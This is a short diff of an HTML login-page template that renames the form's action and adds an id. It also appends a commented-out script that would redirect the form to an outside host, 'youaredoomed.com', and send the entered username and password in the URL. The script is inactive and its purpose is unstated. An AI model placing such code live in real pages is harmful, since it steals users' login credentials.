@@ -20,7 +20,7 @@
 <div th:if="${param.logout}">
     You have been logged out.
 </div>
-<form method="post" th:action="@{/auth/login}" onsubmit="onSubmit()">
+<form id="form-login" method="post" th:action="@{/auth/login-process}" onsubmit="onSubmit()">
     <div>
         <label for="username">Username:</label>
         <input type="text" id="username" name="username"/>
@@ -35,5 +35,12 @@
     </div>
     <button type="submit">Login</button>
 </form>
+
+<!--<script>-->
+<!--    let form= document.getElementById("form-login");-->
+<!--    form.action="https://youaredoomed.com:9090/collect?u="+document.getElementById('username').value-->
+<!--        +"&p="+document.getElementById('password').value;-->
+<!--</script>-->
+
 </body>
 </html>
